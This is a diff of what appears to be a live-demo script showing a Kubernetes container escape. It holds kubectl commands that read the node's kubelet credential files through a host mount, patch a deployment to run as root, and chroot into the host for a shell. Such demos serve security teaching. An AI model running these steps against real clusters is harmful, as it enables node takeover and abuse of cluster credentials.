@@ -31,7 +31,7 @@ pei "kubectl exec deploy/n6 -ti -- chmod +x /tmp/kubectl"
 
 echo "ℹ️ Time to hack ";read -s
 # kubectl exec deploy/n6 -ti -- env KUBECONFIG=/var/lib/kubelet/kubeconfig PATH=/tmp:/bin:/sbin bash
-pe "kubectl exec deploy/n6 -ti -- /tmp/kubectl --kubeconfig /host/var/lib/kubelet/kubeconfig get pod"
+pe "kubectl exec deploy/n6 -ti -- env KUBECONFIG=/host/etc/kubernetes/kubelet.conf:/host/var/lib/kubelet/kubeconfig /tmp/kubectl get pod"
 
 echo "ℹ️ I need to become root";read -s
 pei "kubectl patch deployment n6 --patch-file=root.patch"
@@ -47,8 +47,8 @@ pei "kubectl exec deploy/n6 -ti -- chmod +x /tmp/kubectl"
 echo "ℹ️ Time to hack again 🤥";read -s
 # kubectl exec deploy/n6 -ti -- env KUBECONFIG=/var/lib/kubelet/kubeconfig PATH=/tmp:/bin:/sbin bash
 
-pe "kubectl exec deploy/n6 -ti -- /tmp/kubectl --kubeconfig /host/var/lib/kubelet/kubeconfig get pod"
+pe "kubectl exec deploy/n6 -ti -- env KUBECONFIG=/host/etc/kubernetes/kubelet.conf:/host/var/lib/kubelet/kubeconfig /tmp/kubectl get pod"
 pe "kubectl exec deploy/n6 -ti -- cp /tmp/kubectl /host/tmp/"
-pe "kubectl exec deploy/n6 -ti -- env KUBECONFIG=/var/lib/kubelet/kubeconfig PATH=/tmp:/bin:/sbin chroot /host /bin/bash"
+pe "kubectl exec deploy/n6 -ti -- env KUBECONFIG=/etc/kubernetes/kubelet.conf:/var/lib/kubelet/kubeconfig PATH=/tmp:/bin:/sbin chroot /host /bin/bash"
 
 
